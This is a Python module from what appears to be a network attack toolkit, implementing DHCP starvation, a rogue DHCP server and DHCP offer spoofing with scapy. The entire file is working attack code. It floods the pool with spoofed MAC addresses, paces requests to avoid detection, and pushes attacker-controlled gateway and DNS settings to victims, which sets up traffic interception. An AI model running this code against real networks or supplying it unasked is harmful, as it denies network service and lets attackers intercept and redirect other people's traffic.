"""
DHCP Attack Module - Implements various DHCP-based attacks
"""

import os
import sys
import time
import threading
import subprocess
import random
import socket
import struct
from scapy.all import *
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))
from web.shared import add_log_message_shared as add_log_message

# DHCP Message Types
DHCP_DISCOVER = 1
DHCP_OFFER = 2
DHCP_REQUEST = 3
DHCP_DECLINE = 4
DHCP_ACK = 5
DHCP_NAK = 6
DHCP_RELEASE = 7
DHCP_INFORM = 8

class DHCPAttacker:
    def __init__(self, interface, attack_type="starvation"):
        self.interface = interface
        self.attack_type = attack_type
        self.fake_mac_list = []
        self.dhcp_server_ip = None
        self.gateway_ip = None
        self.subnet_mask = None
        self.lease_time = 3600
        self.rogue_server_ip = "192.168.1.1"
        self.dns_servers = ["8.8.8.8", "1.1.1.1"]

    def generate_fake_mac(self):
        """Generate a random MAC address"""
        mac = [0x00, 0x16, 0x3e,
               random.randint(0x00, 0x7f),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff)]
        return ':'.join(map(lambda x: "%02x" % x, mac))

    def discover_dhcp_server(self):
        """Discover DHCP server on the network"""
        add_log_message("[DHCP] Discovering DHCP server...")

        # Method 1: Try to get DHCP server from current network configuration
        try:
            import subprocess
            # Get default gateway (usually the DHCP server)
            result = subprocess.run(['ip', 'route', 'show', 'default'],
                                  capture_output=True, text=True, check=True)
            if result.stdout:
                gateway_line = result.stdout.strip()
                # Extract gateway IP: "default via 192.168.43.1 dev wlan0"
                parts = gateway_line.split()
                if len(parts) >= 3 and parts[1] == 'via':
                    self.dhcp_server_ip = parts[2]
                    self.gateway_ip = parts[2]
                    add_log_message(f"[DHCP] Found DHCP server from routing table: {self.dhcp_server_ip}")
                    return True
        except Exception as e:
            add_log_message(f"[DHCP] Could not get DHCP server from routing table: {e}")

        # Method 2: Traditional DHCP discovery
        fake_mac = self.generate_fake_mac()
        discover_packet = (
            Ether(dst="ff:ff:ff:ff:ff:ff", src=fake_mac) /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=fake_mac, xid=random.randint(1, 900000000)) /
            DHCP(options=[("message-type", "discover"), "end"])
        )

        # Send discover and wait for offer
        try:
            add_log_message("[DHCP] Sending DHCP discover packet...")
            response = srp1(discover_packet, iface=self.interface, timeout=15, verbose=0)
            if response and response.haslayer(DHCP):
                self.dhcp_server_ip = response[IP].src
                # Extract network information from DHCP options
                for option in response[DHCP].options:
                    if isinstance(option, tuple) and len(option) == 2:
                        if option[0] == 'subnet_mask':
                            self.subnet_mask = option[1]
                        elif option[0] == 'router':
                            self.gateway_ip = option[1]

                add_log_message(f"[DHCP] Found DHCP server via discovery: {self.dhcp_server_ip}")
                add_log_message(f"[DHCP] Gateway: {self.gateway_ip}")
                add_log_message(f"[DHCP] Subnet mask: {self.subnet_mask}")
                return True
            else:
                add_log_message("[DHCP] No DHCP response received")
        except Exception as e:
            add_log_message(f"[DHCP] Error in DHCP discovery: {e}")

        # Method 3: Fallback - assume gateway is DHCP server
        try:
            result = subprocess.run(['ip', 'route', 'show', 'default'],
                                  capture_output=True, text=True, check=True)
            if result.stdout:
                gateway_line = result.stdout.strip()
                parts = gateway_line.split()
                if len(parts) >= 3 and parts[1] == 'via':
                    self.dhcp_server_ip = parts[2]
                    self.gateway_ip = parts[2]
                    self.subnet_mask = "255.255.255.0"  # Common default
                    add_log_message(f"[DHCP] Using gateway as DHCP server (fallback): {self.dhcp_server_ip}")
                    return True
        except Exception as e:
            add_log_message(f"[DHCP] Fallback method failed: {e}")

        add_log_message("[DHCP] All discovery methods failed")
        return False

def dhcp_starvation_worker(interface, target_count, stop_event):
    """
    DHCP Starvation Attack - Exhaust DHCP pool by requesting all available IPs

    Args:
        interface (str): Network interface to use
        target_count (int): Number of DHCP requests to send
        stop_event (threading.Event): Event to signal when to stop
    """
    add_log_message(f"[DHCP Starvation] Starting attack on interface {interface}")
    add_log_message(f"[DHCP Starvation] Target request count: {target_count}")

    attacker = DHCPAttacker(interface, "starvation")

    # First discover the DHCP server
    if not attacker.discover_dhcp_server():
        add_log_message("[DHCP Starvation] Failed to discover DHCP server. Attack aborted.")
        return

    successful_requests = 0
    failed_requests = 0

    try:
        for i in range(target_count):
            if stop_event.is_set():
                add_log_message("[DHCP Starvation] Attack stopped by user")
                break

            # Generate unique MAC for each request
            fake_mac = attacker.generate_fake_mac()
            attacker.fake_mac_list.append(fake_mac)

            # Create DHCP discover packet with proper formatting
            xid = random.randint(1, 900000000)

            # Convert MAC string to bytes for BOOTP
            mac_bytes = bytes.fromhex(fake_mac.replace(':', ''))

            discover_packet = (
                Ether(dst="ff:ff:ff:ff:ff:ff", src=fake_mac) /
                IP(src="0.0.0.0", dst="255.255.255.255") /
                UDP(sport=68, dport=67) /
                BOOTP(
                    op=1,  # Boot request
                    htype=1,  # Ethernet
                    hlen=6,  # Hardware address length
                    xid=xid,
                    chaddr=mac_bytes + b'\x00' * (16 - len(mac_bytes)),  # Pad to 16 bytes
                    flags=0x8000  # Broadcast flag
                ) /
                DHCP(options=[
                    ("message-type", "discover"),
                    ("client_id", b'\x01' + mac_bytes),  # Client identifier
                    ("requested_addr", "0.0.0.0"),
                    ("hostname", f"device-{fake_mac[-5:].replace(':', '')}"),
                    "end"
                ])
            )

            try:
                # Send discover and wait for offer with longer timeout
                add_log_message(f"[DHCP Starvation] Sending DHCP discover from {fake_mac}")
                offer_response = srp1(discover_packet, iface=interface, timeout=8, verbose=0)

                if offer_response and offer_response.haslayer(DHCP):
                    offered_ip = offer_response[BOOTP].yiaddr

                    # Send DHCP request to claim the IP
                    request_packet = (
                        Ether(dst="ff:ff:ff:ff:ff:ff", src=fake_mac) /
                        IP(src="0.0.0.0", dst="255.255.255.255") /
                        UDP(sport=68, dport=67) /
                        BOOTP(chaddr=fake_mac, xid=xid) /
                        DHCP(options=[
                            ("message-type", "request"),
                            ("requested_addr", offered_ip),
                            ("server_id", attacker.dhcp_server_ip),
                            "end"
                        ])
                    )

                    # Send request and wait for ACK
                    ack_response = srp1(request_packet, iface=interface, timeout=5, verbose=0)

                    if ack_response and ack_response.haslayer(DHCP):
                        successful_requests += 1
                        add_log_message(f"[DHCP Starvation] Successfully claimed IP: {offered_ip} ({successful_requests}/{target_count})")
                    else:
                        failed_requests += 1
                        add_log_message(f"[DHCP Starvation] Failed to get ACK for IP: {offered_ip}")
                else:
                    failed_requests += 1
                    add_log_message(f"[DHCP Starvation] No DHCP offer received for request {i+1}")

                # Longer delay between requests to avoid rate limiting
                time.sleep(2.0)  # 2 second delay to avoid detection

            except Exception as e:
                failed_requests += 1
                add_log_message(f"[DHCP Starvation] Error in request {i+1}: {e}")

        add_log_message(f"[DHCP Starvation] Attack completed. Success: {successful_requests}, Failed: {failed_requests}")

    except Exception as e:
        add_log_message(f"[DHCP Starvation] Fatal error: {e}")
    finally:
        add_log_message("[DHCP Starvation] Cleaning up...")

def dhcp_rogue_server_worker(interface, rogue_ip, gateway_ip, dns_servers, stop_event):
    """
    DHCP Rogue Server Attack - Set up malicious DHCP server

    Args:
        interface (str): Network interface to use
        rogue_ip (str): IP address for the rogue DHCP server
        gateway_ip (str): Gateway IP to advertise
        dns_servers (list): List of DNS servers to advertise
        stop_event (threading.Event): Event to signal when to stop
    """
    add_log_message(f"[DHCP Rogue Server] Starting rogue DHCP server on {interface}")
    add_log_message(f"[DHCP Rogue Server] Server IP: {rogue_ip}")
    add_log_message(f"[DHCP Rogue Server] Gateway: {gateway_ip}")
    add_log_message(f"[DHCP Rogue Server] DNS Servers: {', '.join(dns_servers)}")

    # IP pool for rogue server
    ip_pool = []
    base_ip = ".".join(rogue_ip.split(".")[:-1]) + "."
    for i in range(100, 200):  # Pool from .100 to .199
        ip_pool.append(base_ip + str(i))

    assigned_ips = {}

    def handle_dhcp_packet(packet):
        if packet.haslayer(DHCP) and packet.haslayer(BOOTP):
            # Safely parse DHCP options
            dhcp_options = {}
            try:
                for option in packet[DHCP].options:
                    if isinstance(option, tuple) and len(option) >= 2:
                        dhcp_options[option[0]] = option[1]
                    elif isinstance(option, str) and option == 'end':
                        break
            except Exception as e:
                add_log_message(f"[DHCP Rogue Server] Error parsing DHCP options: {e}")
                return

            if dhcp_options.get('message-type') == DHCP_DISCOVER:
                client_mac = packet[Ether].src
                xid = packet[BOOTP].xid

                add_log_message(f"[DHCP Rogue Server] Received DHCP DISCOVER from {client_mac}")

                # Assign IP from pool
                if client_mac not in assigned_ips and ip_pool:
                    assigned_ip = ip_pool.pop(0)
                    assigned_ips[client_mac] = assigned_ip

                    add_log_message(f"[DHCP Rogue Server] Assigning {assigned_ip} to {client_mac}")

                    # Create DHCP offer
                    offer_packet = (
                        Ether(dst=client_mac, src=get_if_hwaddr(interface)) /
                        IP(src=rogue_ip, dst="255.255.255.255") /
                        UDP(sport=67, dport=68) /
                        BOOTP(op=2, yiaddr=assigned_ip, siaddr=rogue_ip,
                              chaddr=packet[BOOTP].chaddr, xid=xid) /
                        DHCP(options=[
                            ("message-type", "offer"),
                            ("server_id", rogue_ip),
                            ("lease_time", 3600),
                            ("subnet_mask", "255.255.255.0"),
                            ("router", gateway_ip),
                            ("name_server", dns_servers[0]),
                            "end"
                        ])
                    )

                    sendp(offer_packet, iface=interface, verbose=0)
                    add_log_message(f"[DHCP Rogue Server] Sent OFFER for {assigned_ip} to {client_mac}")
                elif client_mac in assigned_ips:
                    add_log_message(f"[DHCP Rogue Server] {client_mac} already has IP {assigned_ips[client_mac]}")
                else:
                    add_log_message(f"[DHCP Rogue Server] No IPs available in pool")

            elif dhcp_options.get('message-type') == DHCP_REQUEST:
                client_mac = packet[Ether].src
                xid = packet[BOOTP].xid
                requested_ip = dhcp_options.get('requested_addr')

                if client_mac in assigned_ips and assigned_ips[client_mac] == requested_ip:
                    # Send DHCP ACK
                    ack_packet = (
                        Ether(dst=client_mac, src=get_if_hwaddr(interface)) /
                        IP(src=rogue_ip, dst="255.255.255.255") /
                        UDP(sport=67, dport=68) /
                        BOOTP(op=2, yiaddr=requested_ip, siaddr=rogue_ip,
                              chaddr=packet[BOOTP].chaddr, xid=xid) /
                        DHCP(options=[
                            ("message-type", "ack"),
                            ("server_id", rogue_ip),
                            ("lease_time", 3600),
                            ("subnet_mask", "255.255.255.0"),
                            ("router", gateway_ip),
                            ("name_server", dns_servers[0]),
                            "end"
                        ])
                    )

                    sendp(ack_packet, iface=interface, verbose=0)
                    add_log_message(f"[DHCP Rogue Server] Sent ACK for {requested_ip} to {client_mac}")

    try:
        add_log_message("[DHCP Rogue Server] Starting packet sniffing...")
        sniff(iface=interface, filter="udp port 67 or udp port 68",
              prn=handle_dhcp_packet, stop_filter=lambda x: stop_event.is_set())
    except Exception as e:
        add_log_message(f"[DHCP Rogue Server] Error: {e}")
    finally:
        add_log_message("[DHCP Rogue Server] Stopped")

def dhcp_spoofing_worker(interface, target_mac, malicious_gateway, malicious_dns, stop_event):
    """
    DHCP Spoofing Attack - Intercept and modify DHCP responses

    Args:
        interface (str): Network interface to use
        target_mac (str): Target client MAC address (or "all" for all clients)
        malicious_gateway (str): Malicious gateway IP to inject
        malicious_dns (str): Malicious DNS server to inject
        stop_event (threading.Event): Event to signal when to stop
    """
    add_log_message(f"[DHCP Spoofing] Starting spoofing attack on {interface}")
    add_log_message(f"[DHCP Spoofing] Target: {target_mac}")
    add_log_message(f"[DHCP Spoofing] Malicious Gateway: {malicious_gateway}")
    add_log_message(f"[DHCP Spoofing] Malicious DNS: {malicious_dns}")

    def handle_dhcp_packet(packet):
        if packet.haslayer(DHCP) and packet.haslayer(BOOTP):
            # Safely parse DHCP options
            dhcp_options = {}
            try:
                for option in packet[DHCP].options:
                    if isinstance(option, tuple) and len(option) >= 2:
                        dhcp_options[option[0]] = option[1]
                    elif isinstance(option, str) and option == 'end':
                        break
            except Exception as e:
                add_log_message(f"[DHCP Spoofing] Error parsing DHCP options: {e}")
                return

            # Look for DHCP offers from legitimate server
            if (dhcp_options.get('message-type') == DHCP_OFFER and
                (target_mac == "all" or packet[Ether].dst == target_mac)):

                client_mac = packet[Ether].dst
                server_ip = packet[IP].src
                offered_ip = packet[BOOTP].yiaddr
                xid = packet[BOOTP].xid

                # Create spoofed DHCP offer with malicious options
                spoofed_offer = (
                    Ether(dst=client_mac, src=get_if_hwaddr(interface)) /
                    IP(src=server_ip, dst="255.255.255.255") /
                    UDP(sport=67, dport=68) /
                    BOOTP(op=2, yiaddr=offered_ip, siaddr=server_ip,
                          chaddr=packet[BOOTP].chaddr, xid=xid) /
                    DHCP(options=[
                        ("message-type", "offer"),
                        ("server_id", server_ip),
                        ("lease_time", 3600),
                        ("subnet_mask", "255.255.255.0"),
                        ("router", malicious_gateway),  # Malicious gateway
                        ("name_server", malicious_dns),  # Malicious DNS
                        "end"
                    ])
                )

                # Send spoofed offer quickly to beat legitimate server
                sendp(spoofed_offer, iface=interface, verbose=0)
                add_log_message(f"[DHCP Spoofing] Sent spoofed OFFER to {client_mac} with malicious gateway {malicious_gateway}")

    try:
        add_log_message("[DHCP Spoofing] Starting packet interception...")
        sniff(iface=interface, filter="udp port 67 or udp port 68",
              prn=handle_dhcp_packet, stop_filter=lambda x: stop_event.is_set())
    except Exception as e:
        add_log_message(f"[DHCP Spoofing] Error: {e}")
    finally:
        add_log_message("[DHCP Spoofing] Stopped")
